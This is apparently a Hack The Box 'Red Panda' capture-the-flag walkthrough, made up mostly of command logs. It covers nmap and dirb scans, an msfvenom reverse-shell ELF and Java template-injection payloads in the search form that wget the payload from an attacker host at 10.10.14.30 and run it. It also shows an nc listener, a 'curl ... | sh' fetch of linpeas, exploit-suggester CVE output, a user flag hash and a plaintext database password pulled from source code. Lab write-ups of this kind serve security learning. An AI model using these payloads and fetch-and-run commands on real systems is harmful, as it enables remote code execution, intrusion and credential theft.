# Red Panda

### Challenge: FullPWN

### Tools: nmap, 

### Vulnerabilities:

```console
└──╼ [★]$ nmap -sC -A 10.129.65.161
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 21:38 BST
Nmap scan report for 10.129.65.161
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.10 seconds
```

```console
└──╼ [★]$ dirb http://10.129.65.161:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug 18 21:43:03 2022
URL_BASE: http://10.129.65.161:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.65.161:8080/ ----
+ http://10.129.65.161:8080/error (CODE:500|SIZE:86)                           
+ http://10.129.65.161:8080/search (CODE:405|SIZE:117)                         
+ http://10.129.65.161:8080/stats (CODE:200|SIZE:987)                          
                                                                               
-----------------
END_TIME: Thu Aug 18 21:43:26 2022
DOWNLOADED: 4612 - FOUND: 3
```

```console
└──╼ [★]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=8000 -f elf  > exploit.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```
```
POST /search HTTP/1.1
Host: 10.129.65.161:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: http://10.129.65.161:8080
DNT: 1
Connection: close
Referer: http://10.129.65.161:8080/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.14.30:8000")}
```
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 exploit.elf")}
```
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./exploit.elf")}
```

```console
└──╼ [★]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.65.161 - - [18/Aug/2022 22:56:25] "GET /exploit.elf HTTP/1.1" 200 -
```

```console
└──╼ [★]$ nc -lvnp 8000
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.129.65.161.
Ncat: Connection from 10.129.65.161:58302.
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```console
woodenk@redpanda:/home/woodenk$ cat user.txt
cat user.txt
e42c0d8eb6f8e80b686462868084ab43
woodenk@redpanda:/home/woodenk$ 
```
```console
└──╼ [★]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.65.161 - - [18/Aug/2022 23:09:01] "GET /linpeas.sh HTTP/1.1" 200 -
```
```console
curl http://10.10.14.30:8000/linpeas.sh | sh
```
Vulnerable to CVE-2021-3560


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
   
   

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root logs 422 Aug 18 20:52 /credits/damian_creds.xml
-rw-r----- 1 root logs 426 Aug 18 20:52 /credits/woodenk_creds.xml



```console
<h/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java
```

```console
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```
